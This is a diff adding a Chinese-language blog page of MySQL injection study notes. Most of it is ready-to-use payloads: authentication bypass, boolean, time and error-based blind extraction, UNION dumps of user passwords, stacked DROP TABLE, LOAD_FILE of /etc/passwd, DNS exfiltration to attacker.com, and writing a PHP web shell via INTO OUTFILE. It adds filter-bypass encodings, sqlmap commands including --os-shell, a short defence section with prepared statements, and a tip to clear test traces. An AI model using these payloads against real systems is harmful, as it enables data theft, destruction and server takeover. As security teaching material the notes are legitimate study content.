@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>钟民的个人博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="MySQL 注入漏洞学习笔记📌 1. 注入基础1.1 注入原理12345-- 原始查询SELECT * FROM users WHERE username &#x3D; &#x27;$user&#x27; AND password &#x3D; &#x27;$pass&#x27;-- 注入后SELECT * FROM users WHERE username &#x3D; &#x27;admin&#x27; OR &amp;#x27">
+<meta property="og:type" content="article">
+<meta property="og:title" content="钟民的个人博客">
+<meta property="og:url" content="http://example.com/2026/04/28/mysql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="钟民的个人博客">
+<meta property="og:description" content="MySQL 注入漏洞学习笔记📌 1. 注入基础1.1 注入原理12345-- 原始查询SELECT * FROM users WHERE username &#x3D; &#x27;$user&#x27; AND password &#x3D; &#x27;$pass&#x27;-- 注入后SELECT * FROM users WHERE username &#x3D; &#x27;admin&#x27; OR &amp;#x27">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-28T15:50:20.122Z">
+<meta property="article:modified_time" content="2026-04-28T15:51:07.767Z">
+<meta property="article:author" content="zmdclj">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="钟民的个人博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">钟民的个人博客</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">网络安全技术的分享与日常</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-mysql注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/28/mysql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2026-04-28T15:50:20.122Z" itemprop="datePublished">2026-04-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="MySQL-注入漏洞学习笔记"><a href="#MySQL-注入漏洞学习笔记" class="headerlink" title="MySQL 注入漏洞学习笔记"></a>MySQL 注入漏洞学习笔记</h1><h2 id="📌-1-注入基础"><a href="#📌-1-注入基础" class="headerlink" title="📌 1. 注入基础"></a>📌 1. 注入基础</h2><h3 id="1-1-注入原理"><a href="#1-1-注入原理" class="headerlink" title="1.1 注入原理"></a>1.1 注入原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 原始查询</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$user&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$pass&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注入后</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="comment">-- &#x27; AND password = &#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-常见注入点"><a href="#1-2-常见注入点" class="headerlink" title="1.2 常见注入点"></a>1.2 常见注入点</h3><ul>
+<li>GET&#x2F;POST参数</li>
+<li>HTTP头部</li>
+<li>Cookie参数</li>
+<li>文件上传名</li>
+<li>搜索框</li>
+</ul>
+<h2 id="🔍-2-检测注入"><a href="#🔍-2-检测注入" class="headerlink" title="🔍 2. 检测注入"></a>🔍 2. 检测注入</h2><h3 id="2-1-布尔检测"><a href="#2-1-布尔检测" class="headerlink" title="2.1 布尔检测"></a>2.1 布尔检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 --     # 正常显示</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--     # 异常/无结果</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-错误检测"><a href="#2-2-错误检测" class="headerlink" title="2.2 错误检测"></a>2.2 错误检测</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 union select 1,2,3 -- </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="comment">--     # 判断列数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-时间盲注"><a href="#2-3-时间盲注" class="headerlink" title="2.3 时间盲注"></a>2.3 时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND IF(1=1, SLEEP(5), 0) -- </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">OR</span> IF(ASCII(SUBSTR(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>, SLEEP(<span class="number">3</span>), <span class="number">0</span>) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🎯-3-信息获取"><a href="#🎯-3-信息获取" class="headerlink" title="🎯 3. 信息获取"></a>🎯 3. 信息获取</h2><h3 id="3-1-基础信息"><a href="#3-1-基础信息" class="headerlink" title="3.1 基础信息"></a>3.1 基础信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库版本</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> version()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当前用户</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数据库名</span></span><br><span class="line"><span class="keyword">SELECT</span> database()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-数据库结构"><a href="#3-2-数据库结构" class="headerlink" title="3.2 数据库结构"></a>3.2 数据库结构</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 所有数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> schema_name <span class="keyword">FROM</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当前数据库表</span></span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> database()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 表的列信息</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns</span><br><span class="line"><span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">AND</span> table_schema <span class="operator">=</span> database()</span><br></pre></td></tr></table></figure>
+
+<h2 id="🛠-4-常用函数"><a href="#🛠-4-常用函数" class="headerlink" title="🛠 4. 常用函数"></a>🛠 4. 常用函数</h2><h3 id="4-1-字符串函数"><a href="#4-1-字符串函数" class="headerlink" title="4.1 字符串函数"></a>4.1 字符串函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(str1, str2)      <span class="comment">-- 连接字符串</span></span><br><span class="line">GROUP_CONCAT(col)       <span class="comment">-- 合并多行</span></span><br><span class="line"><span class="built_in">SUBSTRING</span>(str, pos, len) <span class="comment">-- 截取字符串</span></span><br><span class="line">ASCII(<span class="type">char</span>)             <span class="comment">-- 获取ASCII码</span></span><br><span class="line">LENGTH(str)             <span class="comment">-- 字符串长度</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-系统函数"><a href="#4-2-系统函数" class="headerlink" title="4.2 系统函数"></a>4.2 系统函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>)  <span class="comment">-- 读取文件</span></span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/1.php&#x27;</span>  <span class="comment">-- 写入文件</span></span><br><span class="line">SLEEP(<span class="number">5</span>)                   <span class="comment">-- 延迟执行</span></span><br><span class="line">BENCHMARK(<span class="number">1000000</span>, MD5(<span class="string">&#x27;test&#x27;</span>)) <span class="comment">-- 负载测试</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="💡-5-高级技巧"><a href="#💡-5-高级技巧" class="headerlink" title="💡 5. 高级技巧"></a>💡 5. 高级技巧</h2><h3 id="5-1-联合查询注入"><a href="#5-1-联合查询注入" class="headerlink" title="5.1 联合查询注入"></a>5.1 联合查询注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT null, username, password FROM users -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 判断列数</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="comment">-- </span></span><br><span class="line"><span class="string">&#x27; ORDER BY 2 -- </span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">10</span> <span class="comment">--   # 错误时说明列数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-报错注入"><a href="#5-2-报错注入" class="headerlink" title="5.2 报错注入"></a>5.2 报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基于extractvalue</span></span><br><span class="line"><span class="string">&#x27; AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 基于updatexml</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> <span class="keyword">user</span>()), <span class="number">0x7e</span>), <span class="number">1</span>) <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于几何函数</span></span><br><span class="line"><span class="string">&#x27; AND ST_LatFromGeoHash((SELECT * FROM (SELECT * FROM (SELECT user())a)b)) --</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-盲注技术"><a href="#5-3-盲注技术" class="headerlink" title="5.3 盲注技术"></a>5.3 盲注技术</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 布尔盲注</span></span><br><span class="line"><span class="string">&#x27; AND ASCII(SUBSTRING((SELECT user()),1,1)) &gt; 100 -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 时间盲注</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> IF(ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>, SLEEP(<span class="number">3</span>), <span class="number">0</span>) <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于报错的盲注</span></span><br><span class="line"><span class="string">&#x27; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), FLOOR(RAND(0)*2))x </span></span><br><span class="line"><span class="string">FROM information_schema.tables GROUP BY x)a) --</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-堆叠查询"><a href="#5-4-堆叠查询" class="headerlink" title="5.4 堆叠查询"></a>5.4 堆叠查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users; <span class="comment">-- </span></span><br><span class="line">; <span class="keyword">INSERT INTO</span> users <span class="keyword">VALUES</span> (<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;password&#x27;</span>); <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="📁-6-文件操作"><a href="#📁-6-文件操作" class="headerlink" title="📁 6. 文件操作"></a>📁 6. 文件操作</h2><h3 id="6-1-读取文件"><a href="#6-1-读取文件" class="headerlink" title="6.1 读取文件"></a>6.1 读取文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), null, null -- </span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LOAD_FILE(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">SELECT</span> <span class="keyword">user</span>()), <span class="string">&#x27;.attacker.com\\&#x27;</span>))) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-写入文件"><a href="#6-2-写入文件" class="headerlink" title="6.2 写入文件"></a>6.2 写入文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span><span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[cmd]); ?<span class="operator">&gt;</span><span class="string">&#x27; INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>shell.php<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🚫-7-绕过技巧"><a href="#🚫-7-绕过技巧" class="headerlink" title="🚫 7. 绕过技巧"></a>🚫 7. 绕过技巧</h2><h3 id="7-1-编码绕过"><a href="#7-1-编码绕过" class="headerlink" title="7.1 编码绕过"></a>7.1 编码绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- URL编码</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">4</span>f<span class="operator">%</span><span class="number">52</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 十六进制</span></span><br><span class="line"><span class="number">0x61646d696e</span>   <span class="comment">-- admin</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0x61646d696e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符编码</span></span><br><span class="line"><span class="type">CHAR</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)  <span class="comment">-- admin</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-注释绕过"><a href="#7-2-注释绕过" class="headerlink" title="7.2 注释绕过"></a>7.2 注释绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 单行注释</span></span><br><span class="line">#       <span class="operator">%</span><span class="number">23</span>       ;<span class="operator">%</span><span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 内联注释</span></span><br><span class="line"><span class="comment">/*! SELECT */</span>   <span class="comment">/*!50000SELECT*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 换行绕过</span></span><br><span class="line"><span class="string">&#x27;%0AOR%0A&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-关键字绕过"><a href="#7-3-关键字绕过" class="headerlink" title="7.3 关键字绕过"></a>7.3 关键字绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 大小写混合</span></span><br><span class="line"><span class="keyword">UnIoN</span> <span class="keyword">SeLeCt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 双写关键字</span></span><br><span class="line">UNIUNIONON SELSELECTECT</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注释分割</span></span><br><span class="line">U<span class="comment">/**/</span>NI<span class="comment">/**/</span><span class="keyword">ON</span> S<span class="comment">/**/</span>ELECT</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 空白符替代</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-引号绕过"><a href="#7-4-引号绕过" class="headerlink" title="7.4 引号绕过"></a>7.4 引号绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用十六进制</span></span><br><span class="line"><span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646d696e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 宽字节注入</span></span><br><span class="line"><span class="operator">%</span>bf<span class="operator">%</span><span class="number">27</span>  <span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">%</span>bf<span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">27</span>  <span class="operator">=</span><span class="operator">&gt;</span> 縗<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 使用运算符</span></span><br><span class="line"><span class="string">WHERE &#x27;</span>abc<span class="string">&#x27; = &#x27;</span>ab<span class="string">&#x27; &#x27;</span>c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">WHERE &#x27;</span>abc<span class="string">&#x27; LIKE &#x27;</span>ab<span class="string">&#x27; &#x27;</span>c<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🔒-8-防御措施"><a href="#🔒-8-防御措施" class="headerlink" title="🔒 8. 防御措施"></a>🔒 8. 防御措施</h2><h3 id="8-1-输入验证"><a href="#8-1-输入验证" class="headerlink" title="8.1 输入验证"></a>8.1 输入验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型转换</span></span><br><span class="line"><span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-参数化查询"><a href="#8-2-参数化查询" class="headerlink" title="8.2 参数化查询"></a>8.2 参数化查询</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PDO预处理</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$username</span>, <span class="variable">$password</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MySQLi预处理</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-安全配置"><a href="#8-3-安全配置" class="headerlink" title="8.3 安全配置"></a>8.3 安全配置</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini配置</span></span><br><span class="line"><span class="attr">magic_quotes_gpc</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">display_errors</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL配置</span></span><br><span class="line"><span class="attr">secure_file_priv</span> = /tmp/</span><br><span class="line"><span class="attr">local_infile</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="📊-9-实战流程"><a href="#📊-9-实战流程" class="headerlink" title="📊 9. 实战流程"></a>📊 9. 实战流程</h2><h3 id="9-1-基本流程"><a href="#9-1-基本流程" class="headerlink" title="9.1 基本流程"></a>9.1 基本流程</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 寻找注入点</span><br><span class="line"><span class="bullet">2.</span> 判断注入类型</span><br><span class="line"><span class="bullet">3.</span> 获取数据库信息</span><br><span class="line"><span class="bullet">4.</span> 枚举表结构</span><br><span class="line"><span class="bullet">5.</span> 提取目标数据</span><br><span class="line"><span class="bullet">6.</span> 提权/写入文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-2-自动化工具"><a href="#9-2-自动化工具" class="headerlink" title="9.2 自动化工具"></a>9.2 自动化工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQLMap基本使用</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --data=<span class="string">&quot;user=admin&amp;pass=123&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --cookie=<span class="string">&quot;id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用参数</span></span><br><span class="line">--dbs               <span class="comment"># 枚举数据库</span></span><br><span class="line">--tables -D dbname  <span class="comment"># 枚举表</span></span><br><span class="line">--columns -T table  <span class="comment"># 枚举列</span></span><br><span class="line">--dump -C column    <span class="comment"># 导出数据</span></span><br><span class="line">--os-shell         <span class="comment"># 获取系统shell</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="⚠️-10-注意事项"><a href="#⚠️-10-注意事项" class="headerlink" title="⚠️ 10. 注意事项"></a>⚠️ 10. 注意事项</h2><ol>
+<li><strong>合法授权</strong> - 只在授权范围内测试</li>
+<li><strong>最小影响</strong> - 避免对系统造成破坏</li>
+<li><strong>数据备份</strong> - 测试前做好备份</li>
+<li><strong>日志清理</strong> - 清除测试痕迹</li>
+<li><strong>遵守法律</strong> - 不用于非法用途</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/28/mysql%E6%B3%A8%E5%85%A5/" data-id="cuidts4OfFNsLFCX7K2It0SgM" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/04/28/xff%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/">技术笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
